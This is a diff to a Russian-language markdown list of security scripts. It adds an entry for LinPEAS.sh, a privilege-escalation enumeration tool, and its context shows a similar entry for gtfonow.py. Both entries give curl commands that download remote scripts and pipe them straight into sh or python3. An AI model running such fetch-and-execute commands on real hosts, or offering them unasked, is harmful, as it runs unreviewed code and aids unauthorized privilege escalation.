@@ -49,3 +49,12 @@ curl -sSL https://solo10010.github.io/ScriptHub/gtfonow.py | python3
 ```
 ---
 
+**LinPEAS.sh** - это скрипт, который ищет возможные пути повышения привилегий на хостах Linux/Unix*/MacOS. Проверки описаны на https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist.
+
+**Аргументы:** - нету
+
+**OS** - Linux
+
+```bash
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+```
